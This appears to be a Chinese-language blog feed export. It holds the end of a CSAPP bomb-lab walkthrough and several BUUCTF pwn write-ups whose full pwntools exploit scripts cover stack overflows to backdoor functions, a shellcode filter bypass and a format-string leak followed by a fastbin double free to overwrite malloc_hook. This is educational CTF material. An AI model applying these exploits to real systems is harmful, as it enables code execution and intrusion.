<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">400f60:	83 f8 01             	cmp    $0x1,%eax						</span><br><span class="line">400f63:	7f 05                	jg     400f6a &lt;phase_3+0x27&gt;			#至少要输入两个参数		#至少要输入两个参数</span><br></pre></td></tr></table></figure>
<p>下面到了重点，也就是switch语句。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">400f75:	ff 24 c5 70 24 40 00 	jmpq   *0x402470(,%rax,8)				#switch结构</span><br><span class="line">400f7c:	b8 cf 00 00 00       	mov    $0xcf,%eax						#eax &#x3D; 0xcf 	207</span><br><span class="line">400f81:	eb 3b                	jmp    400fbe &lt;phase_3+0x7b&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">400fb9:	b8 37 01 00 00       	mov    $0x137,%eax</span><br><span class="line">400fbe:	3b 44 24 0c          	cmp    0xc(%rsp),%eax</span><br></pre></td></tr></table></figure>
<p>到内存中查看0x402470和0x402478</p>
<p><img src="/2020/07/24/04-05/image-20200723020928192.png" alt="image-20200723020928192"></p>
<p><code>0x402470</code>是当rax=0时，<code>jmpq   *0x402470(,%rax,8)</code>调转到地址<code>0x402470</code>,当rax=1时，<code>jmpq   *0x402470(,%rax,8)</code>调转到地址<code>0x400fb9</code>，一次类推，只要eax属于（0，0xx7），就有它对应的解</p>
<ul>
<li>0    0xcf            207</li>
<li>1    0x137         311</li>
<li>2    0x2c3          707</li>
<li>3    0x100          256</li>
<li>4    0x185          389</li>
<li>5    0xce            206</li>
<li>6    0x2aa          682</li>
<li>7    0x147          327</li>
</ul>
<p>共有八组解，都可以使用</p>
<p>另外，如果不想奋斗看汇编，其实，可以ida里面看伪代码，分分钟秒杀</p>
<p><img src="/2020/07/24/04-05/image-20200723021624745.png" alt="image-20200723021624745"></p>
<h3 id="第四阶段"><a href="#第四阶段" class="headerlink" title="第四阶段"></a>第四阶段</h3><p>读懂程序，就可以简单绕过了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">000000000040100c &lt;phase_4&gt;:</span><br><span class="line">  40100c:	48 83 ec 18          	sub    $0x18,%rsp						</span><br><span class="line">  401010:	48 8d 4c 24 0c       	lea    0xc(%rsp),%rcx</span><br><span class="line">  401015:	48 8d 54 24 08       	lea    0x8(%rsp),%rdx</span><br><span class="line">  40101a:	be cf 25 40 00       	mov    $0x4025cf,%esi</span><br><span class="line">  40101f:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  401024:	e8 c7 fb ff ff       	callq  400bf0 &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line">  401029:	83 f8 02             	cmp    $0x2,%eax						#参数必须是两个</span><br><span class="line">  40102c:	75 07                	jne    401035 &lt;phase_4+0x29&gt;</span><br><span class="line">  40102e:	83 7c 24 08 0e       	cmpl   $0xe,0x8(%rsp)					#第一个参数必须小于等于0xe</span><br><span class="line">  401033:	76 05                	jbe    40103a &lt;phase_4+0x2e&gt;			</span><br><span class="line">  401035:	e8 00 04 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  40103a:	ba 0e 00 00 00       	mov    $0xe,%edx						#edx &#x3D; 0xe</span><br><span class="line">  40103f:	be 00 00 00 00       	mov    $0x0,%esi						#esi &#x3D; 0x0</span><br><span class="line">  401044:	8b 7c 24 08          	mov    0x8(%rsp),%edi					#edi &#x3D; rsp+0x8</span><br><span class="line">  401048:	e8 81 ff ff ff       	callq  400fce &lt;func4&gt;					#func4</span><br><span class="line">  40104d:	85 c0                	test   %eax,%eax						#eax必须等于0</span><br><span class="line">  40104f:	75 07                	jne    401058 &lt;phase_4+0x4c&gt;			</span><br><span class="line">  401051:	83 7c 24 0c 00       	cmpl   $0x0,0xc(%rsp)					#rsp + 0xc 要等于 0x0</span><br><span class="line">  401056:	74 05                	je     40105d &lt;phase_4+0x51&gt;</span><br><span class="line">  401058:	e8 dd 03 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  40105d:	48 83 c4 18          	add    $0x18,%rsp</span><br><span class="line">  401061:	c3                   	retq</span><br></pre></td></tr></table></figure>
<p>这个函数中，得到的消息有，参数必须是两个，其中，第一个不确定，在经过<code>fun4函数</code>后，<code>eax</code>返回值要是0，第二个参数必须是0。</p>
<p>在<code>fun4</code>之前，<code>edx = 0xe</code>、<code>esi = 0x0</code>、<code>edi = rsp+0x8</code>,是fun4的三个参数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0000000000400fce &lt;func4&gt;:</span><br><span class="line">  400fce:	48 83 ec 08          	sub    $0x8,%rsp</span><br><span class="line">  400fd2:	89 d0                	mov    %edx,%eax		#eax &#x3D; edx &#x3D; 0xe</span><br><span class="line">  400fd4:	29 f0                	sub    %esi,%eax		#eax &#x3D; eax - esi(0x0)</span><br><span class="line">  400fd6:	89 c1                	mov    %eax,%ecx		#ecx &#x3D; eax</span><br><span class="line">  400fd8:	c1 e9 1f             	shr    $0x1f,%ecx		#ecx左移5位 &#x3D;&gt; ecx &#x3D; 0</span><br><span class="line">  400fdb:	01 c8                	add    %ecx,%eax		#eax &#x3D; eax + ecx</span><br><span class="line">  400fdd:	d1 f8                	sar    %eax				#右移1位	eax &#x3D; 7</span><br><span class="line">  400fdf:	8d 0c 30             	lea    (%rax,%rsi,1),%ecx	#ecx &#x3D; rax + rsi * 1 7</span><br><span class="line">  400fe2:	39 f9                	cmp    %edi,%ecx			#edi(第一个参数)与ecx比较</span><br><span class="line">  400fe4:	7e 0c                	jle    400ff2 &lt;func4+0x24&gt;	#如果edi &lt;&#x3D; ecx</span><br><span class="line">  400fe6:	8d 51 ff             	lea    -0x1(%rcx),%edx		#edi &gt; ecx，edx &#x3D; rcx -1</span><br><span class="line">  400fe9:	e8 e0 ff ff ff       	callq  400fce &lt;func4&gt;		#递归</span><br><span class="line">  400fee:	01 c0                	add    %eax,%eax</span><br><span class="line">  400ff0:	eb 15                	jmp    401007 &lt;func4+0x39&gt;</span><br><span class="line">  400ff2:	b8 00 00 00 00       	mov    $0x0,%eax  		#如果ecx小于等于edi，eax &#x3D; 0</span><br><span class="line">  400ff7:	39 f9                	cmp    %edi,%ecx		#如果edi &gt;&#x3D; ecx#结束</span><br><span class="line">  400ff9:	7d 0c                	jge    401007 &lt;func4+0x39&gt;</span><br><span class="line">  400ffb:	8d 71 01             	lea    0x1(%rcx),%esi			#esi &#x3D; rcx + 1</span><br><span class="line">  400ffe:	e8 cb ff ff ff       	callq  400fce &lt;func4&gt;			#递归</span><br><span class="line">  401003:	8d 44 00 01          	lea    0x1(%rax,%rax,1),%eax	#eax &#x3D; rax + rax + 1</span><br><span class="line">  401007:	48 83 c4 08          	add    $0x8,%rsp				#结束</span><br><span class="line">  40100b:	c3                   	retq</span><br></pre></td></tr></table></figure>
<p>在执行两次判断之前，<code>eax = 7</code>，接下来是将输入的第一个参数和<code>eax</code>，做比较，第一次如果小于等于，则得到想要的<code>eax=0</code>，再一次比较，如果大于等于，就结束了，所以，相等，即可顺利通过，也就是第一个参数是7.</p>
<p>所以，第四阶段 7 0</p>
<h3 id="第五阶段"><a href="#第五阶段" class="headerlink" title="第五阶段"></a>第五阶段</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">401067:	48 89 fb             	mov    %rdi,%rbx				#rbx &#x3D; rdi(读入的数据)</span><br><span class="line">40106a:	64 48 8b 04 25 28 00 	mov    %fs:0x28,%rax			#rax &#x3D; canary</span><br><span class="line">401071:	00 00 </span><br><span class="line">401073:	48 89 44 24 18       	mov    %rax,0x18(%rsp)			#rsp+0x18 &#x3D; rax &#x3D; canary</span><br><span class="line">401078:	31 c0                	xor    %eax,%eax				#eax &#x3D; 0</span><br><span class="line">40107a:	e8 9c 02 00 00       	callq  40131b &lt;string_length&gt;	#求长度</span><br><span class="line">40107f:	83 f8 06             	cmp    $0x6,%eax				</span><br><span class="line">401082:	74 4e                	je     4010d2 &lt;phase_5+0x70&gt;	#长度必须等于6</span><br></pre></td></tr></table></figure>
<p>要求输入的字符串长度必须是6</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">401089:	eb 47                	jmp    4010d2 &lt;phase_5+0x70&gt;	#eax &#x3D; 0</span><br><span class="line">40108b:	0f b6 0c 03          	movzbl (%rbx,%rax,1),%ecx		#ecx &#x3D; rbx + rax × 1</span><br><span class="line">40108f:	88 0c 24             	mov    %cl,(%rsp)				#(rsp) &#x3D; cl(ecx低16位)ecx</span><br><span class="line">401092:	48 8b 14 24          	mov    (%rsp),%rdx				#rdx &#x3D; (rsp) &#x3D; cl(ecx低16位)</span><br><span class="line">401096:	83 e2 0f             	and    $0xf,%edx				#edx &amp; 0xf(只要edx的低四位)</span><br><span class="line">401099:	0f b6 92 b0 24 40 00 	movzbl 0x4024b0(%rdx),%edx		#edx &#x3D; rdx + 0x4024b0</span><br><span class="line">						0x4024b0 &lt;array.3449&gt;:	&quot;maduiersnfotvbylSo you think you can stop the bomb with ctrl-c, do you?&quot;</span><br><span class="line">4010a0:	88 54 04 10          	mov    %dl,0x10(%rsp,%rax,1)	#rsp + rax × 1 + 0x10 &#x3D; dl(edx的低4位)</span><br><span class="line">4010a4:	48 83 c0 01          	add    $0x1,%rax				#rax + 1</span><br><span class="line">4010a8:	48 83 f8 06          	cmp    $0x6,%rax				#rax与6比较</span><br><span class="line">4010ac:	75 dd                	jne    40108b &lt;phase_5+0x29&gt;</span><br></pre></td></tr></table></figure>
<p>进行了一顿操作，将<code>rax</code>（偏移从0到6） + <code>rbx</code>（输入的）的低4位，在字符串（<code>&quot;maduiersnfotvbylSo you think you can stop the bomb with ctrl-c, do you?&quot;</code>）中找到对应的字符，放入<code>rsp + rax × 1 + 0x10</code>内地址对应的区域，一直放了6个字符</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">4010b3:	be 5e 24 40 00       	mov    $0x40245e,%esi			#esi &#x3D; 0x40245e &quot;flyers&quot;</span><br><span class="line"></span><br><span class="line">4010b8:	48 8d 7c 24 10       	lea    0x10(%rsp),%rdi			#rdi &#x3D; (rsp + 0x10)</span><br><span class="line">4010bd:	e8 76 02 00 00       	callq  401338 &lt;strings_not_equal&gt; #rdi和rsi</span><br><span class="line">4010c2:	85 c0                	test   %eax,%eax				</span><br><span class="line">4010c4:	74 13                	je     4010d9 &lt;phase_5+0x77&gt;	#字符串必须一样</span><br></pre></td></tr></table></figure>
<p>然后将那个地址的字符，放入<code>rdi</code>中，进行字符串比较，要求和内存单元<code>0x40245e</code>里面的一样，也就是字符串<code>&quot;flyers&quot;</code></p>
<p>综上，所以，我们需要的偏移，在对应上面的字符串<code>maduiersnfotvby</code>上找，是9、15、14、5、6、7，也就是我们输入的六个可见字符，他们的低4位需要对应以上数，对应ascii码表，可以区数字部分的，0对应0x30，刚好。</p>
<p><img src="/2020/07/24/04-05/image-20200723212445995.png" alt="image-20200723212445995"></p>
<p>所以，也就是9?&gt;567</p>
<h3 id="第六阶段"><a href="#第六阶段" class="headerlink" title="第六阶段"></a>第六阶段</h3><p>由于最后一个有点复杂，直接在ida里进行分析</p>
<p>主要分为五个小节</p>
<p>第一小节，判断输入数据的合法性</p>
<p><img src="/2020/07/24/04-05/image-20200724034848651.png" alt="image-20200724034848651"></p>
<p>结论：需要输入的数据[1,6]，且两两互不相等</p>
<p>第二小节，对输入的数据进行小小变换操作</p>
<p><img src="/2020/07/24/04-05/image-20200724035019549.png" alt="image-20200724035019549"></p>
<p>结论：原来输入的数据，变成了<code>7-原数据</code></p>
<p>第三小节，将node链表根据输入重新排列到新的地方</p>
<p><img src="/2020/07/24/04-05/image-20200724035051039.png" alt="image-20200724035051039"></p>
<p>因为语句<code>v6 = (int *)*((_QWORD *)v6 + 1);</code>中， <code>+1</code>通过转换加的是qword数据，根据下面图可以，<code>+1</code>后便是下一个node的地址。</p>
<p>因为每次取出输入变换的数据<code>v8</code>，取链上node，一直取，直到走了<code>v8</code>步才停下，赋给了<code>v17..</code>这里的数据</p>
<p><img src="/2020/07/24/04-05/image-20200724035203891.png" alt="image-20200724035203891"></p>
<p>第五小节，判断链上的数据，是否递减排列</p>
<p><img src="/2020/07/24/04-05/image-20200724035304948.png" alt="image-20200724035304948"></p>
<p>node上数据</p>
<ul>
<li>1 0x14c</li>
<li>2 0x0a8</li>
<li>3 0x39c</li>
<li>4 0x2b3</li>
<li>5 0x1dd</li>
<li>6 0x1bb</li>
</ul>
<p>所以，从大到小排列：3 4 5 6 1 2</p>
<p>7 - 原数据 = 现数据</p>
<p>原数据 = 7 - 现数据</p>
<p>结果：4 3 2 1 6 5</p>
<p>Border relations with Canada have never been better.</p>
<p>1 2 4 8 16 32</p>
<p>0 207</p>
<p>7 0</p>
<p>9?&gt;567</p>
<p>4 3 2 1 6 5</p>
<p><img src="/2020/07/24/04-05/image-20200724040224131.png" alt="image-20200724040224131"></p>
]]></content>
      <tags>
        <tag>csapp</tag>
      </tags>
  </entry>
  <entry>
    <title>buu每日一题（2）</title>
    <url>/2021/05/08/00-04/</url>
    <content><![CDATA[<h2 id="bjdctf-2020-babystack2"><a href="#bjdctf-2020-babystack2" class="headerlink" title="bjdctf_2020_babystack2"></a>bjdctf_2020_babystack2</h2><blockquote>
<p>简单的，首先通过整数溢出绕过检查，然后栈溢出，存在后门函数，直接执行即可</p>
</blockquote>
<p><img src="/2021/05/08/00-04/Users\YCNN\AppData\Roaming\Typora\typora-user-images\image-20210506201527291.png" alt="image-20210506201527291"></p>
<h3 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">"./bjdctf_2020_babystack2"</span>)</span><br><span class="line">p=remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">28526</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line"></span><br><span class="line">backdoor = <span class="number">0x000400726</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"name:"</span>)</span><br><span class="line">p.sendline(str(<span class="number">-1</span>))</span><br><span class="line">p.recvuntil(<span class="string">"name?"</span>)</span><br><span class="line">payload = <span class="string">'a'</span>*(<span class="number">0x10</span>+<span class="number">0x8</span>)+p64(backdoor)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>buu</category>
      </categories>
      <tags>
        <tag>buu刷题</tag>
      </tags>
  </entry>
  <entry>
    <title>buu每日一题（4）</title>
    <url>/2021/05/08/00-04/</url>
    <content><![CDATA[<h2 id="starctf-2019-babyshell"><a href="#starctf-2019-babyshell" class="headerlink" title="starctf_2019_babyshell"></a>starctf_2019_babyshell</h2><blockquote>
<p>tql，shellcode的题新花样</p>
</blockquote>
<h3 id="程序流程"><a href="#程序流程" class="headerlink" title="程序流程"></a>程序流程</h3><blockquote>
<p>mmap开辟空间，输入shellcode，然后绕过检查即可执行shellcode</p>
</blockquote>
<p><img src="/2021/05/08/00-04/Users\YCNN\AppData\Roaming\Typora\typora-user-images\image-20210506205132913.png" alt="image-20210506205132913"></p>
<blockquote>
<p>要绕过检查，令第一个字符为空即可。</p>
</blockquote>
<p><img src="/2021/05/08/00-04/Users\YCNN\AppData\Roaming\Typora\typora-user-images\image-20210506205233682.png" alt="image-20210506205233682"></p>
<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>为了让shellcode正常执行，需要构造一条合法以\x00开头的语句。</p>
<p><code>\x00b\x00</code>、<code>\x00b\x22</code>都是合法语句。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#\x00b\x00</span><br><span class="line">pwndbg&gt; x&#x2F;30gx 0x7f77a00c1000</span><br><span class="line">0x7f77a00c1000:	0x2fb848686a006200&lt;&#x3D;	0x50732f2f2f6e6962</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x&#x2F;30i 0x7f77a00c1000</span><br><span class="line">   0x7f77a00c1000:	add    BYTE PTR [rdx+0x0],ah</span><br><span class="line">   0x7f77a00c1003:	push   0x68</span><br><span class="line">#三个字节组成一个语句</span><br><span class="line"></span><br><span class="line">#同理</span><br><span class="line">pwndbg&gt; x&#x2F;30gx 0x7fb05ae4b000</span><br><span class="line">0x7fb05ae4b000:	0x2fb848686a226200	0x50732f2f2f6e6962</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x&#x2F;30i 0x7fb05ae4b000</span><br><span class="line">   0x7fb05ae4b000:	add    BYTE PTR [rdx+0x22],ah</span><br><span class="line">   0x7fb05ae4b003:	push   0x68</span><br></pre></td></tr></table></figure>
<p>所以，只要在shellcode之前加入’\x00b\x00’即可绕过检查，并正常执行shellcode</p>
<h3 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">"./starctf_2019_babyshell"</span>)</span><br><span class="line"><span class="comment"># p=remote("node3.buuoj.cn",27975)</span></span><br><span class="line">context.log_level =<span class="string">'debug'</span></span><br><span class="line">context.arch=<span class="string">'amd64'</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'\x00b\x22'</span>+asm(shellcraft.sh())</span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="wustctf2020-name-your-cat"><a href="#wustctf2020-name-your-cat" class="headerlink" title="wustctf2020_name_your_cat"></a>wustctf2020_name_your_cat</h2><blockquote>
<p>简单的栈题，覆盖返回地址为后门函数即可。</p>
<p>但是不知道为什么，，发送数据为一个地址的话，会导致程序崩溃（无法正常进行下一次的循环），所以要把发送后门地址放在最后一个。</p>
</blockquote>
<p>程序流程：</p>
<ol>
<li>for循环五次</li>
<li>输入一个数字</li>
<li>往8*v+base的地方发送7个字符的数据</li>
</ol>
<p>但是程序没有检查输入的数字大小，而base位于<code>[ebp-34h]</code>的地址，所以在0x34+4的位置存储的就是返回地址，也就是数字7（0x38/8=7），发送后门函数的地址即可。</p>
<h3 id="完整exp-1"><a href="#完整exp-1" class="headerlink" title="完整exp"></a>完整exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">"./wustctf2020_name_your_cat"</span>)</span><br><span class="line"><span class="comment"># p = remote("node3.buuoj.cn",26079)</span></span><br><span class="line">elf = ELF(<span class="string">"./wustctf2020_name_your_cat"</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">shell = <span class="number">0x080485CB</span> </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(num,payload)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"which"</span>)</span><br><span class="line">	p.sendline(str(num))</span><br><span class="line">	p.recvuntil(<span class="string">"Give your name plz: "</span>)</span><br><span class="line">	p.sendline(payload)</span><br><span class="line">gdb.attach(p)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">	add(<span class="number">1</span>,p64(shell))</span><br><span class="line">add(<span class="number">7</span>,p64(shell))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="gyctf-2020-some-thing-interesting"><a href="#gyctf-2020-some-thing-interesting" class="headerlink" title="gyctf_2020_some_thing_interesting"></a>gyctf_2020_some_thing_interesting</h2><blockquote>
<p>printf+uaf</p>
<p>一开始没看到格式化字符串，，，TAT</p>
<p>emm，格式化字符串，泄露%3$p的位置，，，和远程貌似有点不对。。。。<del>知道泄露栈上数据，但是太前面了，gdb都没找到，可以尽量在10附近左右看看</del></p>
</blockquote>
<h3 id="程序流程-1"><a href="#程序流程-1" class="headerlink" title="程序流程"></a>程序流程</h3><ol>
<li><p>格式化字符串部分</p>
<blockquote>
<p>可以输入19个字节，只需要前14个字节可以匹配成功即可。</p>
</blockquote>
</li>
</ol>
<p><img src="/2021/05/08/00-04/Users\YCNN\AppData\Roaming\Typora\typora-user-images\image-20210507220553456.png" alt="image-20210507220553456"></p>
<blockquote>
<p>前面输入的字符串，存在格式化字符串，有5个字节可以利用，可以用来泄露libc地址</p>
</blockquote>
<p><img src="/2021/05/08/00-04/Users\YCNN\AppData\Roaming\Typora\typora-user-images\image-20210507220712091.png" alt="image-20210507220712091"></p>
<ol>
<li>正常堆体<ol>
<li>add功能：创建0~0x70大小的块</li>
<li>修改：没有溢出</li>
<li>释放：uaf，其实可以直接修改uaf，不用double free</li>
<li>打印</li>
</ol>
</li>
</ol>
<h3 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><ol>
<li>根据格式化字符串，泄露libc地址</li>
<li>根据uaf，申请块到mallochook</li>
<li>覆盖malloc_hook为gadget即可</li>
</ol>
<h3 id="完整exp-2"><a href="#完整exp-2" class="headerlink" title="完整exp"></a>完整exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># p = process("./gyctf_2020_some_thing_interesting")</span></span><br><span class="line"><span class="comment"># p = remote("node3.buuoj.cn",27779)</span></span><br><span class="line"><span class="comment"># p = process(["./gyctf_2020_some_thing_interesting"],</span></span><br><span class="line">            <span class="comment"># env=&#123;"LD_PRELOAD":"./libc-2.23.so"&#125;)</span></span><br><span class="line">p = process([<span class="string">"/usr/local/glibc-2.23/lib/ld-2.23.so"</span>, <span class="string">"./gyctf_2020_some_thing_interesting"</span>],</span><br><span class="line">            env=&#123;<span class="string">"LD_PRELOAD"</span>:<span class="string">"/usr/local/glibc-2.23/lib/libc-2.23.so"</span>&#125;)</span><br><span class="line">elf = ELF(<span class="string">"./gyctf_2020_some_thing_interesting"</span>)</span><br><span class="line"><span class="comment"># libc = ELF("./libc-2.23.so")</span></span><br><span class="line">libc = ELF(<span class="string">"/usr/local/glibc-2.23/lib/libc-2.23.so"</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">init</span><span class="params">()</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"&gt; Input your code please:"</span>)</span><br><span class="line">	<span class="comment"># p.sendline("OreOOrereOOreO%3$p")</span></span><br><span class="line">	gdb.attach(p)</span><br><span class="line">	p.sendline(<span class="string">"OreOOrereOOreO%13$p"</span>)</span><br><span class="line">init()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span><span class="params">(choice)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"want to do :"</span>)</span><br><span class="line">	p.sendline(str(choice))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">()</span>:</span></span><br><span class="line">	cmd(<span class="number">0</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"OreOOrereOOreO0x"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(o_size,o_content,re_size,re_content)</span>:</span></span><br><span class="line">	cmd(<span class="number">1</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"&gt; O's length : "</span>)</span><br><span class="line">	p.sendline(str(o_size))</span><br><span class="line">	p.recvuntil(<span class="string">"&gt; O : "</span>)</span><br><span class="line">	p.sendline(o_content)</span><br><span class="line">	p.recvuntil(<span class="string">"&gt; RE's length : "</span>)</span><br><span class="line">	p.sendline(str(re_size))</span><br><span class="line">	p.recvuntil(<span class="string">"&gt; RE : "</span>)</span><br><span class="line">	p.sendline(re_content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(oid,o_content,re_content)</span>:</span></span><br><span class="line">	cmd(<span class="number">2</span>)	</span><br><span class="line">	p.recvuntil(<span class="string">"&gt; Oreo ID : "</span>)</span><br><span class="line">	p.sendline(str(oid))</span><br><span class="line">	p.recvuntil(<span class="string">"&gt; O : "</span>)</span><br><span class="line">	p.sendline(o_content)</span><br><span class="line">	p.recvuntil(<span class="string">"&gt; RE : "</span>)</span><br><span class="line">	p.sendline(re_content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(oid)</span>:</span></span><br><span class="line">	cmd(<span class="number">3</span>)	</span><br><span class="line">	p.recvuntil(<span class="string">"&gt; Oreo ID : "</span>)</span><br><span class="line">	p.sendline(str(oid))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">view</span><span class="params">(oid)</span>:</span></span><br><span class="line">	cmd(<span class="number">4</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"&gt; Oreo ID : "</span>)</span><br><span class="line">	p.sendline(str(oid))</span><br><span class="line"></span><br><span class="line">check()</span><br><span class="line">xie = int(p.recv(<span class="number">12</span>).strip(),<span class="number">16</span>)- <span class="number">0xf0</span></span><br><span class="line">libc_base = xie -libc.sym[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">log.success(hex(xie))</span><br><span class="line">log.success(hex(libc_base))</span><br><span class="line">gdb.attach(p)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">malloc_hook = libc_base + libc.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">realloc_hook = libc_base + libc.sym[<span class="string">'__libc_realloc'</span>]</span><br><span class="line"></span><br><span class="line">fake_chunk = malloc_hook - <span class="number">0x23</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">"aaaa"</span>,<span class="number">0x20</span>,<span class="string">'bbbb'</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">"aaaa"</span>,<span class="number">0x20</span>,<span class="string">'bbbb'</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># edit(1,'a',p64(fake_chunk))</span></span><br><span class="line">add(<span class="number">0x68</span>,p64(fake_chunk),<span class="number">0x68</span>,p64(fake_chunk))</span><br><span class="line"></span><br><span class="line"><span class="comment"># onegadget = [0x3f3f6,0x3f44a,0xd5c17]</span></span><br><span class="line">onegadget = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">"a"</span>,<span class="number">0x68</span>,<span class="string">'b'</span>*<span class="number">0x13</span>+p64(onegadget[<span class="number">3</span>]+libc_base))</span><br><span class="line"><span class="comment"># log.success(hex(onegadget[0]+libc_base))</span></span><br><span class="line"><span class="comment"># p.recvuntil("#######################\n")</span></span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"&gt; O's length : "</span>)</span><br><span class="line">p.sendline(str(<span class="number">0x20</span>))</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<blockquote>
<p>本题首先需要细心，能发现格式化字符串，其次，格式化的话，需要找到栈上，在比较后面，stack 30第一个也是%12$p</p>
</blockquote>
]]></content>
      <categories>
        <category>buu</category>
      </categories>
      <tags>
        <tag>buu刷题</tag>
      </tags>
  </entry>
  <entry>
    <title>ciscn_2019_es_7</title>
    <url>/2021/05/06/19-23/</url>
    <content><![CDATA[<blockquote>
<p>其实做过一次<a href="https://warm-winter.github.io/2020/11/20/buu%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/#12-ciscn-2019-s-3" target="_blank" rel="noopener">第一次wp</a>，，，但是再做还是不太可，重新写一篇【两篇侧重点不一样】</p>
</blockquote>
<h3 id="题目流程"><a href="#题目流程" class="headerlink" title="题目流程"></a>题目流程</h3><blockquote>
<p>两个函数，read和write</p>
</blockquote>
<p><img src="/2021/05/06/19-23/image-20210506185234819.png" alt="image-20210506185234819"></p>
<blockquote>
<p>输入和打印的是同一个地址，rsp+buf，buf的长度为0x10。</p>
<p>所以栈溢出的偏移为0x10，再下一个地址是rsp，ret的时候，pop eip会取过来。</p>
</blockquote>
<p><img src="/2021/05/06/19-23/image-20210506185325681.png" alt="image-20210506185325681"></p>
<blockquote>
<p>程序给了两个后门函数</p>
<p>第一个是rax，设置0xf，可以进行srop</p>
<p>第二个设置为execve的调用号，设置参数为“/bin/sh”、0、0（必须设置，因为vuln函数中rdi，rsi和rdx都有值）即可get shell</p>
</blockquote>
<p><img src="/2021/05/06/19-23/image-20210506185517298.png" alt="image-20210506185517298"></p>
<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>综上，有两种方法可以进行漏洞利用</p>
<ol>
<li>利用gadget2，需要设置三个寄存器参数，可以通过ret2csu来设置</li>
<li>利用gadget1，srop来get shell</li>
</ol>
<blockquote>
<p> 其次，程序还可以泄漏信息，在输入0x10处和0x20处都存在栈上的地址，布置“/bin/sh”在上面，泄漏栈地址，即计算得到binsh的地址。</p>
<p> 为了程序正常返回继续利用，故泄漏0x20的地址。</p>
</blockquote>
